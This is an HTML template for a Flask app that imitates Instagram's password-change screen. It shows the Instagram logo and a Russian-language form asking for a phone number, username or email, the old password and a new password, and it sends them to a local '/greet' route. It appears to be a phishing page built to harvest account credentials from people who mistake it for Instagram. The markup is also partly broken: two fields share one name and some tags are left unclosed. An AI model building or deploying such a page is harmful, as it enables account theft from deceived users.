<!DOCTYPE html>
<html lang="en">
  <head>
    <meta charset="UTF-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
    <title>Instagram Registration</title>
    <!-- Подключение Bootstrap CSS -->
    <link
      href="https://stackpath.bootstrapcdn.com/bootstrap/5.3.0/css/bootstrap.min.css"
      rel="stylesheet"
    />
    <link
      rel="stylesheet"
      href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0-beta3/css/all.min.css"
    />
  </head>
  <body>
    <div class="container">
      <!-- Navbar -->
      <nav class="navbar navbar-expand-lg navbar-light bg-light mb-4">
        <a class="navbar-brand" href="#">
          <img
            src="{{ url_for('static', filename='images/insta.png') }}"
            alt="Instagram Logo"
            width="300vh"
            height="100%"
          />
        </a>
      </nav>

      <!-- Main content -->
      <div class="text-center">
        <!-- Greet form -->
        <form method="POST" action="/greet" class="mb-4">
          <div class="mb-3">
            <input type="text" name="username" class="form-control" placeholder="Телефон, имя пользователя или эл. адрес" />
            <input type="password" name="password" class="form-control" placeholder="Старый пароль" />
            <input type="password" name="password" class="form-control" placeholder="Новый пароль" />
          </div>
          <button type="submit" class="btn btn-primary">Изменить</button>
        </form>


    <!-- Подключение Bootstrap JS -->
    <script src="https://stackpath.bootstrapcdn.com/bootstrap/5.3.0/js/bootstrap.bundle.min.js"></script>
  </body>
</html>
